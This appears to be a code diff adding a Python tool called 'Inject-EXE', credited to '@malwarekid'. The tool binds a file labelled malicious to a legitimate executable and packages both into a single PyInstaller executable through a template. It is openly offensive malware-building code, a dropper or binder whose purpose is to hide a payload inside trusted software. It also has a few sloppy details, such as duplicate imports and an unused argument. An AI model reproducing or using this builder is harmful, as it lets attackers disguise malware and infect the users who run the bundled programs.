@@ -1,0 +1,120 @@
+import os
+import PyInstaller.__main__
+import shutil
+import sys
+import uuid
+import ctypes
+import argparse
+def get_resource_path(filename):
+    if getattr(sys, 'frozen', False):
+        # Ejecutándose desde un .exe generado por PyInstaller
+        return os.path.join(sys._MEIPASS, filename)
+    return os.path.join(os.path.abspath("."), filename)
+def get_file_slice(path, max_size):
+    with open(path, "rb") as f:
+        return f.read(max_size)
+
+def auto_copy_self():
+    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+    filename = f"copy_{uuid.uuid4().hex[:8]}.exe"
+    destination = os.path.join(os.getcwd(), filename)
+    if "copy_" in os.path.basename(current_path):
+        return current_path
+    try:
+        shutil.copy2(current_path, destination)
+        return destination
+    except Exception as e:
+        ctypes.windll.user32.MessageBoxW(0, f"Error al copiar: {e}", "Error", 0)
+        return None
+
+import os
+import sys
+import ctypes
+
+def get_script_dir():
+    if getattr(sys, 'frozen', False):
+        return os.path.dirname(sys.executable)
+    return os.path.dirname(os.path.abspath(__file__))
+
+def main():
+    # Mostrar MessageBox de bienvenida (sin detener si es copia)
+    ctypes.windll.user32.MessageBoxW(0, "damian de cristal.", "Inject-EXE", 0x40 | 0x1)
+
+    print("\033[38;2;255;69;172m" + r'''
+    ____        _           __        _______  __ ______
+   /  _/___    (_)__  _____/ /_      / ____/ |/ // ____/
+   / // __ \  / / _ \/ ___/ __/_____/ __/  |   // __/   
+ _/ // / / / / /  __/ /__/ /_/_____/ /___ /   |/ /___   
+/___/_/ /_/_/ /\___/\___/\__/     /_____//_/|_/_____/   
+         /___/                                          
+                                      By @malwarekid
+''' + "\033[0m")
+    parser = argparse.ArgumentParser(description="Inject one EXE into another.")
+    parser.add_argument('--legit', required=True, help='Path to legit executable')
+    parser.add_argument('--sliced', required=True, help='Path to shellcode/inject binary')
+    parser.add_argument('--template', default='extra_template.py', help='Python template file for payload')
+    args = parser.parse_args()
+
+    legit_exe = args.legit
+    sliced_exe = args.sliced
+    template_file = args.template
+    # Solicitar el archivo legítimo como entrada
+    #legit_exe = input("Enter your \033[32mlegit\033[0m executable: ").strip()
+    print(f"[INFO] Archivo legítimo recibido: {legit_exe}")
+
+    if not os.path.isfile(legit_exe):
+        print(f"[!] No se encontró el archivo: {legit_exe}")
+        return
+    mal_copy_path = auto_copy_self()
+    if not mal_copy_path:
+        return
+
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    legit_path = os.path.abspath(legit_exe)
+    if not os.path.exists(legit_path):
+        print("Archivo legit.exe no encontrado.")
+        return
+
+    #  Limitar el tamaño de la copia maliciosa
+    MAX_SLICE_SIZE = 300 * 1024  # 300 KB
+    sliced_path = os.path.join(script_dir, f"mal_sliced_{uuid.uuid4().hex[:6]}.bin")
+    with open(sliced_path, "wb") as f:
+        f.write(get_file_slice(mal_copy_path, MAX_SLICE_SIZE))
+
+    mal_basename = os.path.basename(sliced_path)
+    legit_basename = os.path.basename(legit_path)
+
+    # Crear archivo extra.py con nombres de archivo personalizados
+#template_path = os.path.join(script_dir, "extra_template.py")
+    template_path = get_resource_path("extra_template.py")
+
+    output_path = os.path.join(script_dir, "extra.py")
+
+    with open(template_path, "r", encoding="utf-8") as f:
+        template = f.read()
+
+    customized = template.replace("__MALICIOUS__", mal_basename).replace("__LEGIT__", legit_basename)
+
+    with open(output_path, "w", encoding="utf-8") as f:
+        f.write(customized)
+
+    # Crear ejecutable con PyInstaller
+    PyInstaller.__main__.run([
+        'extra.py',
+        '--onefile',
+        f'--add-data={sliced_path};.',
+        f'--add-data={legit_path};.',
+        f'--add-data={template_path};.',  # INCLUIR extra_template.py
+        '--distpath=dist',
+        '--workpath=build',
+        '--specpath=spec',
+        '--noconfirm'
+    ])
+
+    # Limpiar archivos temporales
+    os.remove(output_path)
+    os.remove(sliced_path)
+    print("Hecho.")
+
+if __name__ == "__main__":
+    main()
